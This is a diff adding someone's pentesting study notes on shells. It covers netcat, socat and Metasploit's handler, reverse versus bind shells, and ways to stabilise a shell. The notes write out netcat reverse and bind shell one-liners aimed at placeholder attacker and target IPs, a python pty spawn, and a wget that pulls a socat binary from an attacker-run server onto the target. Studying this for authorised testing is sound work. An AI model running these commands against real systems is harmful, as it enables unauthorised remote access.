@@ -1,0 +1,149 @@
+
+--------------------WHAT THE SHELL?-----------------------
+
+Netcat:
+	Swiss army knife of networking
+	
+	- netcat shells are unstable (easy to lose)
+
+
+Socat:
+	Netcat on steroids
+
+	- more stable shells
+	- complex syntax
+	- not installed on linux by default
+
+Metasploit --multi/handler:
+	exploit/multi/handler
+
+	- the only way to interact with meterpreter shells
+	- being part of metasploit provides ways to stable and improve shells
+	- easyest way to handle staged payloads
+
+Msfvenom:
+	Used to generate payloads on the fly
+
+
+# Repositories of shells in different languages:
+	kali comes with /usr/share/webshells
+	- Payloads all the things
+	- PentestMonkey Reverse shell cheatsheet
+	- Seclists repo
+
+
+Types of shells:
+    +Reverse shells:
+	TARGET ------> ATTACKER
+
+	- good bypass firewall
+	- bad attacker network open ports
+
+    +bind shells:
+	TARGET<------- ATTACKER
+
+	- need open ports on target network
+	- firewall problems
+	- not changing attacker network
+
+    +interactive:
+	Allows for user interaction (like ssh ask for a password, etc)
+
+    +non-interactive:
+	limited use of programs without interaction (no text editors, ssh, etc)
+
+
+# EXAMPLES #
+
+
++REVERSE SHELL+
+
+Netcat:
+
+    ATTACKER:
+	$: sudo nc -lvnp <port>
+
+    TARGET:
+	$: nc <attacker ip> <port> -e /bin/bash
+
+
++BIND SHELL+
+
+Netcat:
+
+    TARGET:
+	$: nc -lvnp <port> -e "cmd.exe"
+
+    ATTACKER:
+	$: nc <target ip> <port>
+
+
+#######   NETCAT   #######
+
+Reverse shell:
+
+    Listener syntax> $: nc -lnvp <port-number>
+
+	-l: listener
+	-v: verbose
+	-n: don't resolve names or use DNS (only IP(?))
+	-p: port to listen to
+
+    Target syntax> $: nc <attacker-ip> <port> -e /bin/bash
+
+	-e: execute (binary, exe, or path)
+
+
+
+#        -= STABILISATION =-
+
+Netcat shells are inestable by default.
+Ctrl + c kills the whole thing
+Non-interactive
+
+
+---PYTHON---
+
+    technique for linux boxes (normally comes with python)
+
+	1. $: python -c 'import pty;pty.spawn("/bin/bash")'
+		might require python version (python2, python3)
+
+	2. $: export TERM=xterm
+		gives access to commands like clear
+
+	3. Ctrl+Z Background the shell
+	   In our terminal use:
+	   $: stty raw -echo; fg
+	   turns off our own echo(acces to tab-complete, arrow keys, ctrl+c)
+
+
+
+---rlwrap---
+
+    Very usefull for Windows
+    automatic history, autocomplete and arrow keys
+    some stabilisation still required for Ctrl+C
+
+rlwrap doesn't come preinstalled on kali: sudo apt install rlwrap
+
+    Listener:
+	$: rlwrap nc -lvnp <port>
+
+    Gain Ctrl+C full stabilisation:
+	Ctrl + Z then stt raw -echo; fg
+
+
+
+---Socat---
+
+    Socat is not stable on windows
+    
+    1. Initial netcat shell
+    
+    2. Transfer a socat static compiled binary
+	2.1 sudo python3 -m http.server 80 (start local server on folder with socat)
+	2.2 wget <LOCAL-IP>/socat -O /tmp/socat (download and open socat on target)
+
+
+
